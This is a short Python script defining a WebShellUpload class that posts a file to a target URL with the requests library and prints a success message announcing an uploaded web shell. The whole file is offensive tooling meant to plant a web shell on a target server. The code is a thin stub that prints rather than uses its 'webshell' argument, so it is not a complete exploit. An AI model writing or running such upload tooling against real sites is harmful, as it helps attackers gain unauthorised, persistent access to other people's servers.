import requests

class WebShellUpload:
    def __init__(self, target_url):
        self.target_url = target_url

    def upload(self, file_path, webshell):
        files = {"file": (file_path, open(file_path, 'rb'))}
        response = requests.post(self.target_url, files=files)
        if response.status_code == 200:
            print(f"Webshell uploaded successfully: {webshell}")
            return True
        else:
            print("Upload failed")
            return False
